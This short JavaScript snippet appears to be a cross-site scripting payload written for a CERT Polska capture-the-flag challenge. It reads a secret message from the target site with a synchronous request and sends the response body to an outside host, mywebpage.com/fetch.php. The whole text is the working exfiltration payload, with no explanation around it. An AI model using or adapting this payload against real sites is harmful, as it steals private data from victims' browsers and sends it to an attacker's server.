var xhr = new XMLHttpRequest();
xhr.open("GET", 'https://secretmessage.ecsm2016.cert.pl/cd16c496f53e43e7a72db2255a0939fb/19672f63d34f440d82de55970b1fa13a', false);
xhr.send();

var data = xhr.responseText;

xhr.open("POST", 'http://mywebpage.com/fetch.php', false);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("body="+data);
